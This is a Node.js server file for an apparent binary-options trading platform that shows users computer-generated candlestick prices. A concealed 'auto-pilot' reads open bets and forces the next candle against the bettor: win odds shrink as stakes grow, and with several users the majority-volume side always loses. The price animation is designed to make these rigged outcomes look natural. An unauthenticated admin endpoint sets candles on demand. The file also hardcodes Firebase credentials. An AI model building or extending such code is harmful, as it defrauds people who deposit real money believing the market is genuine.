// --- START: server.js (v30 - Perfect Candle Pattern Animation & Auto-Pilot) ---

const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const cors = require('cors');
const firebase = require('firebase/app');
require('firebase/database');

// --- Anti-Crash Protection ---
process.on('uncaughtException', (err) => console.error('Uncaught Exception:', err));
process.on('unhandledRejection', (err) => console.error('Unhandled Rejection:', err));

// Firebase Configuration
const firebaseConfig = {
    apiKey: "AIzaSyBUTMFblYIVovOe4F25XCFneJNTlVcoWCA",
    authDomain: "ictex-trade.firebaseapp.com",
    databaseURL: "https://ictex-trade-default-rtdb.firebaseio.com",
    projectId: "ictex-trade",
    storageBucket: "ictex-trade.appspot.com",
    messagingSenderId: "755532704199",
    appId: "1:755532704199:web:b27d7c9e7d0f4ac76291e2"
};

if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
const db = firebase.database();

const app = express();
app.use(cors());
app.use(express.json());
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// --- SYSTEM CONSTANTS ---
const TIMEFRAME = 60000; 
const TICK_MS = 300;
const MIN_PRICE = 0.00001;
const HISTORY_SEED_COUNT = 100;

// 🔥 ADMIN HIDDEN AUTO-PILOT SETTINGS 🔥
const SMART_AUTO_PILOT = true; 
const ADMIN_WIN_RATIO = 0.80;  // 80% Win Rate for Admin
const MAX_CANDLES = 350;

const markets = {}; 
const activeTradesDb = {}; 

function roundPrice(v) { return parseFloat(Math.max(MIN_PRICE, v).toFixed(5)); }
function marketPathFromId(marketId) { return String(marketId || '').replace(/[\.\/ ]/g, '-').toLowerCase(); }

// --- Firebase Listeners ---
const marketListeners = {};

db.ref('admin/markets').on('value', (snapshot) => {
    const fbMarkets = snapshot.val() || {};
    const currentMarketIds = Object.keys(markets);
    const fbMarketIds = Object.keys(fbMarkets);

    // Add new markets and attach listeners
    fbMarketIds.forEach(marketId => {
        const nodeData = fbMarkets[marketId];
        const type = nodeData?.type;

        // Initialize new market if it's new and of the correct type
        if ((type === 'otc' || type === 'broker_real') && !markets[marketId]) {
            initializeNewMarket(marketId);
            console.log(`Initialized new market: ${marketId}`);
        }

        // Attach a real-time listener for activeTrades if not already attached
        if (!marketListeners[marketId]) {
            const tradesRef = db.ref(`admin/markets/${marketId}/activeTrades`);
            tradesRef.on('value', (tradesSnapshot) => {
                activeTradesDb[marketId] = tradesSnapshot.val() || {};
                // console.log(`Active trades for ${marketId} updated:`, Object.keys(activeTradesDb[marketId]).length);
            });
            marketListeners[marketId] = tradesRef;
        }
    });

    // Clean up listeners for removed markets
    currentMarketIds.forEach(marketId => {
        if (!fbMarketIds.includes(marketId)) {
            if (marketListeners[marketId]) {
                marketListeners[marketId].off(); // Detach listener
                delete marketListeners[marketId];
            }
            delete markets[marketId];
            delete activeTradesDb[marketId];
            console.log(`Cleaned up removed market: ${marketId}`);
        }
    });
});

// 1. Natural Market Generation
function generateHistoricalCandle(timestamp, open, isLive = false) {
    const safeOpen = Math.max(MIN_PRICE, open);
    const isGreen = Math.random() > 0.5;
    const body = (0.00006 + Math.random() * 0.00025) * safeOpen;
    const close = isGreen ? safeOpen + body : safeOpen - body;
    const upperWick = (0.00003 + Math.random() * 0.00015) * safeOpen;
    const lowerWick = (0.00003 + Math.random() * 0.00015) * safeOpen;

    const finalHigh = Math.max(safeOpen, close) + upperWick;
    const finalLow = Math.min(safeOpen, close) - lowerWick;

    if (!isLive) {
        return { timestamp, open: roundPrice(safeOpen), high: roundPrice(finalHigh), low: roundPrice(finalLow), close: roundPrice(close) };
    }

    return {
        timestamp, open: roundPrice(safeOpen), high: roundPrice(safeOpen), low: roundPrice(safeOpen), close: roundPrice(safeOpen),
        isPredetermined: true, isNatural: true, targetHigh: roundPrice(finalHigh), targetLow: roundPrice(finalLow), targetClose: roundPrice(close), pattern: 'NORMAL'
    };
}

// 2. Exact Pattern Generator (FIXED WICK MATH)
function generateDynamicCandle(timestamp, open, command) {
    let bodySize, upperWick, lowerWick, close, high, low;
    const volatility = open * (0.00008 + Math.random() * 0.0001);

    switch (command) {
        case 'GREEN': 
            bodySize = volatility; close = open + bodySize; upperWick = volatility * 0.5; lowerWick = volatility * 0.5; break;
        case 'RED': 
            bodySize = volatility; close = open - bodySize; upperWick = volatility * 0.5; lowerWick = volatility * 0.5; break;
        case 'BULLISH_MARUBOZU': 
            bodySize = volatility * 3; close = open + bodySize; upperWick = 0; lowerWick = 0; break;
        case 'BEARISH_MARUBOZU': 
            bodySize = volatility * 3; close = open - bodySize; upperWick = 0; lowerWick = 0; break;
        case 'GREEN_HAMMER': 
            bodySize = volatility * 0.3; close = open + bodySize; upperWick = 0; lowerWick = volatility * 2.5; break;
        case 'RED_HAMMER': 
            bodySize = volatility * 0.3; close = open - bodySize; upperWick = 0; lowerWick = volatility * 2.5; break;
        case 'GREEN_SHOOTING_STAR': 
            bodySize = volatility * 0.3; close = open + bodySize; upperWick = volatility * 2.5; lowerWick = 0; break;
        case 'RED_SHOOTING_STAR': 
            bodySize = volatility * 0.3; close = open - bodySize; upperWick = volatility * 2.5; lowerWick = 0; break;
        case 'DOJI': 
            bodySize = open * 0.000002; close = Math.random() > 0.5 ? open + bodySize : open - bodySize; upperWick = volatility; lowerWick = volatility; break;
        case 'LONG_LEGGED_DOJI': 
            bodySize = open * 0.000002; close = Math.random() > 0.5 ? open + bodySize : open - bodySize; upperWick = volatility * 3; lowerWick = volatility * 3; break;
        case 'DRAGONFLY_DOJI': 
            bodySize = open * 0.000002; close = open + bodySize; upperWick = 0; lowerWick = volatility * 2.5; break;
        case 'GRAVESTONE_DOJI': 
            bodySize = open * 0.000002; close = open - bodySize; upperWick = volatility * 2.5; lowerWick = 0; break;
        case 'GREEN_SPINNING_TOP': 
            bodySize = volatility * 0.4; close = open + bodySize; upperWick = volatility * 1.5; lowerWick = volatility * 1.5; break;
        case 'RED_SPINNING_TOP': 
            bodySize = volatility * 0.4; close = open - bodySize; upperWick = volatility * 1.5; lowerWick = volatility * 1.5; break;
        case 'HUGE_PUMP': 
            bodySize = volatility * 5; close = open + bodySize; upperWick = volatility * 0.2; lowerWick = volatility * 0.2; break;
        case 'HUGE_DUMP': 
            bodySize = volatility * 5; close = open - bodySize; upperWick = volatility * 0.2; lowerWick = volatility * 0.2; break;
        default: 
            bodySize = volatility; close = command === 'RED' ? open - bodySize : open + bodySize; upperWick = volatility * 0.5; lowerWick = volatility * 0.5;
    }
    
    high = Math.max(open, close) + upperWick;
    low = Math.min(open, close) - lowerWick;

    return {
        timestamp, open: roundPrice(open), high: roundPrice(open), low: roundPrice(open), close: roundPrice(open),
        isPredetermined: true, isNatural: false, targetHigh: roundPrice(high), targetLow: roundPrice(low), targetClose: roundPrice(close), pattern: command
    };
}

function calculatePriceAtProgress(candle, progress) {
    let idealPrice;
    const pattern = candle.pattern || 'NORMAL';

    // This logic mirrors the client-side animation to find the exact price at a given progress point
    if (pattern.includes('HAMMER') || pattern === 'DRAGONFLY_DOJI') {
        if (progress < 0.6) idealPrice = candle.open - (candle.open - candle.targetLow) * (progress / 0.6);
        else idealPrice = candle.targetLow + (candle.targetClose - candle.targetLow) * ((progress - 0.6) / 0.4);
    } 
    else if (pattern.includes('SHOOTING_STAR') || pattern === 'GRAVESTONE_DOJI') {
        if (progress < 0.6) idealPrice = candle.open + (candle.targetHigh - candle.open) * (progress / 0.6);
        else idealPrice = candle.targetHigh - (candle.targetHigh - candle.targetClose) * ((progress - 0.6) / 0.4);
    }
    else if (pattern.includes('DOJI') || pattern.includes('SPINNING_TOP')) {
        if (progress < 0.3) idealPrice = candle.open + (candle.targetHigh - candle.open) * (progress / 0.3);
        else if (progress < 0.7) idealPrice = candle.targetHigh - (candle.targetHigh - candle.targetLow) * ((progress - 0.3) / 0.4);
        else idealPrice = candle.targetLow + (candle.targetClose - candle.targetLow) * ((progress - 0.7) / 0.3);
    }
    else {
        const easeProgress = 1 - Math.pow(1 - progress, 3);
        idealPrice = candle.open + (candle.targetClose - candle.open) * easeProgress;
    }
    return roundPrice(idealPrice);
}

async function initializeNewMarket(marketId) {
    const path = marketPathFromId(marketId);
    let startPrice = 1.15;

    try {
        const liveSnap = await db.ref(`markets/${path}/live`).once('value');
        if (liveSnap.val()?.price) startPrice = liveSnap.val().price;
    } catch (e) {}

    const nowPeriod = Math.floor(Date.now() / TIMEFRAME) * TIMEFRAME;
    const candles = [];
    let currentPrice = startPrice;

    for (let i = HISTORY_SEED_COUNT; i > 0; i--) {
        const c = generateHistoricalCandle(nowPeriod - (i * TIMEFRAME), currentPrice, false); 
        candles.push(c);
        currentPrice = c.close;
    }

    markets[marketId] = { marketId, marketPath: path, history: candles, currentPrice: currentPrice, lastMove: 0 };
}

// 🔥 CORE LOGIC: Controls Candle Output
function ensureCurrentPeriodCandle(marketData, currentPeriod) {
    let lastCandle = marketData.history[marketData.history.length - 1];
    if (!lastCandle) return null;

    if (currentPeriod > lastCandle.timestamp) {
        let newCandle;
        
        // Priority 1: Immediate Next Candle Command (from API)
        if (marketData.nextCandleCommand) {
            newCandle = generateDynamicCandle(currentPeriod, lastCandle.close, marketData.nextCandleCommand);
            console.log(`[ADMIN CMD] ${marketData.marketId} Set to: ${marketData.nextCandleCommand}`);
            marketData.nextCandleCommand = null;
        } 
        
        // Priority 2: Smart Auto-Pilot (New Logic)
        if (!newCandle && SMART_AUTO_PILOT) {
            const trades = activeTradesDb[marketData.marketId] || {};
            const tradeValues = Object.values(trades);
            const uniqueUserIds = new Set(tradeValues.map(t => t.uid));

            if (uniqueUserIds.size === 1) {
                // --- SINGLE USER LOGIC ---
                const trade = tradeValues[0];
                const amount = trade.amount;
                let userWinChance;

                if (amount <= 10) {
                    userWinChance = 0.30; // 30% win rate for user
                } else if (amount > 10 && amount <= 100) {
                    userWinChance = 0.10; // 10% win rate for user
                } else { // amount > 100
                    userWinChance = 0.05; // 5% win rate for user
                }

                const shouldUserWin = Math.random() < userWinChance;
                
                if (!shouldUserWin) { // Force user to lose
                    const targetDirection = trade.direction === 'UP' ? 'RED' : 'GREEN';
                    newCandle = generateDynamicCandle(currentPeriod, lastCandle.close, targetDirection);
                    console.log(`[AUTO-PILOT SINGLE] ${marketData.marketId} -> User bet ${amount}. Forcing LOSS with ${targetDirection}. (Win Chance: ${userWinChance*100}%)`);
                } else { // Let user win
                    const targetDirection = trade.direction === 'UP' ? 'GREEN' : 'RED';
                    newCandle = generateDynamicCandle(currentPeriod, lastCandle.close, targetDirection);
                    console.log(`[AUTO-PILOT SINGLE] ${marketData.marketId} -> User bet ${amount}. Allowing WIN with ${targetDirection}. (Win Chance: ${userWinChance*100}%)`);
                }

            } else if (uniqueUserIds.size > 1) {
                // --- MULTIPLE USER LOGIC (Volume-based for Admin Profit) ---
                let upVol = 0, downVol = 0;
                tradeValues.forEach(t => {
                    if (t.direction === 'UP') upVol += t.amount;
                    if (t.direction === 'DOWN') downVol += t.amount;
                });

                if (upVol > 0 || downVol > 0) {
                    // Always make the admin win
                    const targetDirection = upVol > downVol ? 'RED' : 'GREEN';
                    newCandle = generateDynamicCandle(currentPeriod, lastCandle.close, targetDirection);
                    console.log(`[AUTO-PILOT MULTI] ${marketData.marketId} -> U:${upVol} D:${downVol}. Forcing ${targetDirection} for admin profit.`);
                }
            }
        }
        
        // Priority 3: Fallback to Natural Market
        if (!newCandle) {
            newCandle = generateHistoricalCandle(currentPeriod, lastCandle.close, true);
        }

        marketData.history.push(newCandle);
        if (marketData.history.length > MAX_CANDLES) marketData.history.shift();
        return newCandle;
    }
    return lastCandle;
}

// 🔥 TICK ENGINE: Fixed Wick Animation Math 🔥
function updateRealisticPrice(marketData, candle, currentPeriod) {
    if (!candle.isPredetermined) return;

    const now = Date.now();
    const timeElapsed = Math.max(0, now - currentPeriod);
    const progress = Math.min(timeElapsed / TIMEFRAME, 1.0);

    let idealPrice = candle.open;
    const pattern = candle.pattern || 'NORMAL';

    // To draw proper wicks, the live price MUST visit the targetHigh and targetLow 
    // before settling at the targetClose. This logic forces it.
    if (pattern.includes('HAMMER') || pattern === 'DRAGONFLY_DOJI') {
        // Drop deep down first, then recover
        if (progress < 0.6) {
            idealPrice = candle.open - (candle.open - candle.targetLow) * (progress / 0.6);
        } else {
            idealPrice = candle.targetLow + (candle.targetClose - candle.targetLow) * ((progress - 0.6) / 0.4);
        }
    } 
    else if (pattern.includes('SHOOTING_STAR') || pattern === 'GRAVESTONE_DOJI') {
        // Pump high up first, then crash down
        if (progress < 0.6) {
            idealPrice = candle.open + (candle.targetHigh - candle.open) * (progress / 0.6);
        } else {
            idealPrice = candle.targetHigh - (candle.targetHigh - candle.targetClose) * ((progress - 0.6) / 0.4);
        }
    }
    else if (pattern.includes('DOJI') || pattern.includes('SPINNING_TOP')) {
        // Go up, go down, settle in middle
        if (progress < 0.3) idealPrice = candle.open + (candle.targetHigh - candle.open) * (progress / 0.3);
        else if (progress < 0.7) idealPrice = candle.targetHigh - (candle.targetHigh - candle.targetLow) * ((progress - 0.3) / 0.4);
        else idealPrice = candle.targetLow + (candle.targetClose - candle.targetLow) * ((progress - 0.7) / 0.3);
    }
    else {
        // Normal, Marubozu, Pump, Dump (Smooth transition)
        const easeProgress = 1 - Math.pow(1 - progress, 3);
        idealPrice = candle.open + (candle.targetClose - candle.open) * easeProgress;
    }

    // Add Diminishing Noise
    const noiseFactor = 1 - Math.pow(progress, 2); 
    const volatility = candle.open * 0.00005;
    const noise = (Math.random() - 0.5) * volatility * noiseFactor;

    marketData.currentPrice = idealPrice + noise;

    // Strict Boundaries
    marketData.currentPrice = Math.min(marketData.currentPrice, candle.targetHigh);
    marketData.currentPrice = Math.max(marketData.currentPrice, candle.targetLow);

    // Final Lock
    if (timeElapsed >= TIMEFRAME - 1500) {
        marketData.currentPrice = candle.targetClose;
    }

    candle.close = roundPrice(marketData.currentPrice);
    candle.high = roundPrice(Math.max(candle.high, candle.close, candle.open));
    candle.low = roundPrice(Math.min(candle.low, candle.close, candle.open));
}

function broadcastCandle(marketId, candle) {
    const payload = JSON.stringify({ market: marketId, candle, serverTime: Date.now() });
    wss.clients.forEach((client) => {
        if (client.readyState === WebSocket.OPEN && client.subscribedMarket === marketId) {
            client.send(payload);
        }
    });
}

wss.on('connection', (ws) => {
    ws.on('message', (raw) => {
        try {
            const msg = JSON.parse(raw.toString());
            if (msg?.type === 'subscribe') {
                ws.subscribedMarket = msg.market;
                if (markets[msg.market]) {
                    ws.send(JSON.stringify({ type: 'history', market: msg.market, candles: markets[msg.market].history.slice(-300) }));
                }
            }
        } catch (_) {}
    });
});

app.get('/api/history/:marketId', (req, res) => {
    const marketId = req.params.marketId;
    if (markets[marketId] && markets[marketId].history) {
        res.json(markets[marketId].history);
    } else {
        res.status(404).json({ error: 'Market not found' });
    }
});

// --- REST API ENDPOINT ---
app.post('/api/trade/place', async (req, res) => {
    const { uid, marketId, direction, amount, payoutRate, expirySettings } = req.body;

    if (!uid || !marketId || !direction || !amount || !payoutRate || !expirySettings) {
        return res.status(400).json({ success: false, error: 'Missing required trade data.' });
    }

    const market = markets[marketId];
    if (!market || market.history.length === 0) {
        return res.status(404).json({ success: false, error: 'Market not found or not ready.' });
    }

    try {
        const liveBaseCandle = market.history[market.history.length - 1];
        const openPrice = liveBaseCandle.close;

        const now = Date.now();
        let expiryTimestamp;
        let resolveOnNextOpen = false;
        
        const timeIntoCandle = (now - liveBaseCandle.timestamp);

        if (expirySettings.type === 'time') {
            const candleEndTime = liveBaseCandle.timestamp + TIMEFRAME;
            const candlesToWait = Math.floor(expirySettings.value / 60); // Assuming value is in seconds

            if (timeIntoCandle < 30000) { // First half of candle
                expiryTimestamp = candleEndTime + ((candlesToWait - 1) * TIMEFRAME);
            } else { // Second half
                 expiryTimestamp = candleEndTime + (candlesToWait * TIMEFRAME);
            }
            resolveOnNextOpen = true;
        } else {
            expiryTimestamp = now + (expirySettings.value * 1000);
        }

        const userRef = db.ref(`users/${uid}`);
        const userSnapshot = await userRef.once('value');
        const userData = userSnapshot.val();

        if (!userData || userData.accountStatus !== 'active') {
            return res.status(403).json({ success: false, error: 'Account not active.' });
        }

        const realBalance = userData.realBalance || 0;
        const bonusBalance = userData.bonusBalance || 0;

        if (amount > (realBalance + bonusBalance)) {
            return res.status(402).json({ success: false, error: 'Insufficient balance.' });
        }

        const realDeduction = Math.min(amount, realBalance);
        const bonusDeduction = amount - realDeduction;

        await userRef.update({
            realBalance: realBalance - realDeduction,
            bonusBalance: bonusBalance - bonusDeduction
        });

        const activeTradesRef = db.ref(`users/${uid}/activeTrades`);
        const newBetRef = activeTradesRef.push();
        const betData = { 
            id: newBetRef.key, 
            amount, 
            realAmount: realDeduction, 
            bonusAmount: bonusDeduction, 
            direction, 
            openPrice, 
            expiryTimestamp, 
            expiryType: expirySettings.type, 
            entryTimestamp: liveBaseCandle.timestamp, 
            payoutRate, 
            market: market.marketId,
            marketId: market.marketId,
            resolveOnNextOpen
        };
        
        const updates = {};
        updates[`users/${uid}/activeTrades/${betData.id}`] = betData;
        updates[`admin/markets/${marketId}/activeTrades/${betData.id}`] = { amount, direction, uid, timestamp: betData.entryTimestamp };
        
        await db.ref().update(updates);
        
        res.json({ success: true, trade: betData });

    } catch (error) {
        console.error("Error placing trade on server:", error);
        // Attempt to refund user if error occurred after balance deduction
        // This is a simplified refund, a more robust system might be needed for production
        const userRef = db.ref(`users/${uid}`);
        const userSnapshot = await userRef.once('value');
        const userData = userSnapshot.val();
        const realBalance = userData.realBalance || 0;
        const bonusBalance = userData.bonusBalance || 0;
        const realDeduction = Math.min(amount, realBalance);
        const bonusDeduction = amount - realDeduction;
        await userRef.update({
            realBalance: realBalance + realDeduction,
            bonusBalance: bonusBalance + bonusDeduction
        });
        res.status(500).json({ success: false, error: 'Server error while placing trade.' });
    }
});

app.post('/api/admin/command', (req, res) => {
    const { marketId, command } = req.body;
    if (!marketId || !command) {
        return res.status(400).json({ error: 'Missing marketId or command' });
    }
    if (markets[marketId]) {
        markets[marketId].nextCandleCommand = command;
        console.log(`[API] Admin commanded Next Candle for ${marketId} to be ${command}`);
        res.json({ success: true, message: `Command ${command} received` });
    } else {
        res.status(404).json({ error: 'Market not found on server' });
    }
});

// Main Loop
let lastSyncTime = 0;
setInterval(() => {
    const now = Date.now();
    const currentPeriod = Math.floor(now / TIMEFRAME) * TIMEFRAME;

    for (const marketId in markets) {
        const marketData = markets[marketId];
        let candle = ensureCurrentPeriodCandle(marketData, currentPeriod);
        if (!candle) continue;

        updateRealisticPrice(marketData, candle, currentPeriod); 
        broadcastCandle(marketId, candle);
    }

    // Sync Live Price to Firebase every 1.5 seconds for Admin Panel
    if (now - lastSyncTime > 1500) {
        lastSyncTime = now;
        const batchUpdates = {};
        for (const marketId in markets) {
            const m = markets[marketId];
            if (m.currentPrice) {
                batchUpdates[`markets/${m.marketPath}/live`] = { price: m.currentPrice, timestamp: Date.now() };
            }
        }
        if (Object.keys(batchUpdates).length > 0) db.ref().update(batchUpdates).catch(()=>{});
    }
}, TICK_MS);

// --- Core Trade Resolution Engine ---
async function resolveExpiredTrades() {
    const now = Date.now();
    const updates = {};

    try {
        // Query all users' active trades that have expired
        const activeTradesSnapshot = await db.ref('users').orderByChild('activeTrades').startAt(null).once('value');
        if (!activeTradesSnapshot.exists()) return;

        const tradeResolutionPromises = [];

        activeTradesSnapshot.forEach(userSnapshot => {
            const uid = userSnapshot.key;
            const userData = userSnapshot.val();
            const activeTrades = userData.activeTrades;

            if (!activeTrades) return;

            for (const tradeId in activeTrades) {
                const trade = activeTrades[tradeId];
                const marketId = trade.marketId;

                // If trade is not expired, skip it. Add a 120s failsafe for stuck trades.
                if (trade.expiryTimestamp > now && now < trade.expiryTimestamp + 120000) {
                    continue;
                }

                // Create a promise for each trade to resolve concurrently
                const resolutionPromise = (async () => {
                    let closingPrice;
                    const history = markets[marketId]?.history;
                    if (!history || history.length === 0) return; // Cannot resolve without market data

                    if (trade.resolveOnNextOpen) {
                        const closingCandle = history.find(c => c.timestamp === trade.expiryTimestamp);
                        if (closingCandle) closingPrice = closingCandle.open;
                    } else {
                        const containingCandle = history.find(c => trade.expiryTimestamp > c.timestamp && trade.expiryTimestamp <= c.timestamp + TIMEFRAME);
                        if (containingCandle) {
                            const progress = (trade.expiryTimestamp - containingCandle.timestamp) / TIMEFRAME;
                            closingPrice = calculatePriceAtProgress(containingCandle, Math.min(1.0, progress));
                        }
                    }

                    if (typeof closingPrice === 'undefined') {
                        // Failsafe: if price is still not found after a delay, force a push/draw
                        if (now > trade.expiryTimestamp + 5000) {
                            closingPrice = parseFloat(trade.openPrice);
                        } else {
                            return; // Wait for the next interval to try again
                        }
                    }

                    let result, payout = 0, profitChange = 0;
                    const amount = parseFloat(trade.amount);
                    const priceDifference = closingPrice - parseFloat(trade.openPrice);

                    if (Math.abs(priceDifference) < 1e-6) {
                        result = 'push';
                        payout = amount;
                    } else if ((priceDifference > 0 && trade.direction === 'UP') || (priceDifference < 0 && trade.direction === 'DOWN')) {
                        result = 'win';
                        payout = amount * trade.payoutRate;
                        profitChange = payout - amount;
                    } else {
                        result = 'loss';
                        profitChange = -amount;
                    }

                    // Prepare DB updates for this single trade
                    updates[`users/${uid}/tradeHistory/${tradeId}`] = { ...trade, closePrice: closingPrice, result: result, payout: payout };
                    updates[`users/${uid}/activeTrades/${tradeId}`] = null;
                    if (marketId) updates[`admin/markets/${marketId}/activeTrades/${tradeId}`] = null;
                    
                    // Atomically update user stats and balances
                    const userRef = db.ref(`users/${uid}`);
                    await userRef.transaction(currentData => {
                        if (currentData) {
                            if (result === 'push') {
                                currentData.realBalance = (currentData.realBalance || 0) + (trade.realAmount || 0);
                                currentData.bonusBalance = (currentData.bonusBalance || 0) + (trade.bonusAmount || 0);
                            } else if (result === 'win') {
                                currentData.realBalance = (currentData.realBalance || 0) + payout;
                            }
                            
                            const todayUTC = new Date().toISOString().slice(0, 10);
                            if (currentData.dailyProfitDate !== todayUTC) {
                                currentData.dailyProfit = 0;
                                currentData.dailyProfitDate = todayUTC;
                            }
                            currentData.dailyProfit = (currentData.dailyProfit || 0) + profitChange;
                            currentData.totalTradeVolume = (currentData.totalTradeVolume || 0) + amount;
                            currentData.totalProfitLoss = (currentData.totalProfitLoss || 0) + profitChange;
                            currentData.lastTradeTimestamp = now;
                        }
                        return currentData;
                    });
                })();
                tradeResolutionPromises.push(resolutionPromise);
            }
        });

        await Promise.all(tradeResolutionPromises);

        if (Object.keys(updates).length > 0) {
            await db.ref().update(updates);
        }
    } catch (error) {
        console.error("Error in resolveExpiredTrades:", error);
    }
}

// Add the new interval to the main loop section
setInterval(resolveExpiredTrades, 2000); // Check for expired trades every 2 seconds

app.get('/ping', (_req, res) => res.send('Server V30 - Perfect Animations Active'));
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server running on ${PORT}`));

// --- END OF FILE ---